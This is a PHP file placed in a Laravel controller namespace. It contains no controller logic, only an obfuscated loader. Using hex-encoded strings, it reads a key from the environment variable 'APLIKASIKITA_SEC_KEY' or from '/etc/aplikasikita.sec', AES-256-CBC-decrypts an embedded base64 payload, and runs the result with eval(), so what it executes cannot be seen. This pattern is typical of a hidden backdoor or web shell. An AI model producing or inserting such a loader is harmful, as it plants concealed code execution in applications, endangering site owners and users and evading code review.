<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('T5Y8uk7V0eYjd4/UacdFww==');

$c=base64_decode(

'yfI1HPcmzL6lG+ZBdpFK9mxNLsN6jfLc319q1lWcnHdYerE9f2cmux9DoesoVA1JixAIPWyoLRLP' .
'AvbRKJVjnwofSFxWzdb8xCfW5kOEAq6uuVObyB4o+snhmY1tlXEygkZok1qFygPgP4v5jBLXCZFv' .
'jjQO7nrFbYmVN/Jz9pIf/LcDfiMeKMFD8jUWcHgL3bsJC5xRFXfRBkw9nJQa3r6wdd4W8MOasYRd' .
'7/IarTwwCctvtmDvSDcaT/KO7gFF'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

